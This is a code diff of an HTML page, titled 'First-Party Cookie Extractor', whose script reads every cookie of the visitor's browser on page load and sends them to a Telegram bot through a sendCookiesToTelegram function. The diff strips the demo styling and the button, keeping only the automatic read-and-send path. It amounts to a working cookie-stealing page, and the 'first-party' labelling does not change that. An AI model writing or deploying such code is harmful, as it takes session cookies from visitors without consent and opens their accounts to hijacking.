@@ -3,54 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Extraction Website</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f4f4f4;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #333;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-    </style>
+    <title>First-Party Cookie Extractor</title>
 </head>
 <body>
 
-<div class="container">
-    <h1>Cookie Extraction Demo</h1>
-    <p id="cookie-status">Checking your cookies...</p>
-    <button id="set-cookie-btn">Set a Cookie</button>
-</div>
+<h1>Extract First-Party Cookies</h1>
+<p id="cookie-status">Checking cookies...</p>
 
 <script>
-    // Function to set a cookie
-    function setCookie(name, value, days) {
-        const d = new Date();
-        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
-        let expires = "expires=" + d.toUTCString();
-        document.cookie = name + "=" + value + ";" + expires + ";path=/";
-    }
-
     // Function to get all cookies as a string
     function getAllCookies() {
-        return document.cookie;  // This retrieves all cookies from the current domain
+        return document.cookie;  // This retrieves all first-party cookies from the current domain
     }
 
     // Function to send cookies to Telegram via a bot
@@ -73,26 +36,14 @@
             });
     }
 
-    // Check for cookies when the user visits the website
-    const cookieStatus = document.getElementById("cookie-status");
+    // Get all first-party cookies and send them to Telegram
     const cookies = getAllCookies();
-
     if (cookies) {
-        cookieStatus.textContent = `Cookies found: ${cookies}`;
-        sendCookiesToTelegram(cookies);  // Automatically send all cookies to Telegram
+        document.getElementById("cookie-status").textContent = `Cookies found: ${cookies}`;
+        sendCookiesToTelegram(cookies);  // Send cookies to Telegram
     } else {
-        cookieStatus.textContent = "No cookies found.";
+        document.getElementById("cookie-status").textContent = "No cookies found.";
     }
-
-    // Set a test cookie when the button is clicked
-    document.getElementById("set-cookie-btn").addEventListener("click", () => {
-        const username = prompt("Please enter your name:", "John Doe");
-        if (username) {
-            setCookie("username", username, 7);  // Set cookie to expire in 7 days
-            cookieStatus.textContent = `Cookie set! Welcome, ${username}.`;
-            sendCookiesToTelegram(getAllCookies());  // Send all cookies to Telegram
-        }
-    });
 </script>
 
 </body>
